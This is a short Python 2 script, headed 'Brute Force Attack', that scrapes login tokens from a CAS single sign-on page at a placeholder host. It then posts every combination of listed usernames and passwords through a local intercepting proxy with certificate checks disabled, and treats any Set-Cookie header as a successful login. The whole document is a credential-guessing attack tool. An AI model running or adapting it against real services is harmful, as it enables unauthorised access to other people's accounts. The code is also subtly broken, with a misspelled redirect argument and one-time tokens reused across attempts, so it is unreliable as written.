import requests
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()

# Initializing Session object
s = requests.Session()
s.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

r_get = s.get("https://abc.com:123/cas/login", verify=False)

data = []
soup = BeautifulSoup(r_get.text, features="lxml")
data = data + soup.find_all("div", {"class" : "login btn-login"})

for i in data:
	lt = i.find_all("input")[0]["value"]
	execution = i.find_all("input")[1]["value"]
	
_eventId = "submit"
submit = "Login"
username = ['test1', 'test2', 'test3']
password = ['pwd1', 'pwd2', 'pwd3', 'pwd4']

print "\n##############################################"
print "\tBrute Force Attack"
print "##############################################"

for user in username:
	for pwd in password:
		data = {"username":user, "password":pwd, "lt":lt, "execution":execution, '_eventId':_eventId, 'submit':submit}
		r = s.post("https://abc.com:123/cas/login?service=https://abc.com:456/app/application1.html", verify=False, data=data, allow_redirect=True)
		
		headers = dict(r.headers)
		
		if headers.has_key('Set-Cookie'):
			print "\nLogin Success for: ", user, " and ", pwd
		else:
			print "\nLogin Failed for: ", user, " and ", pwd
print "\nAfter login headers: \n", r.headers

r_postlogin = s.get("https://abc.com:456/app/application1.html", verify=False, allow_redirect=True)

print "\n---------------------------------------"
print "\nRequest Headers that were sent to server: \n", r_postlogin.request.headers
print "\n---------------------------------------"
print "Response Headers after resource request: \n", r_postlogin.headers
print "Response Status Code: ",r_postlogin.status_code, "\n"
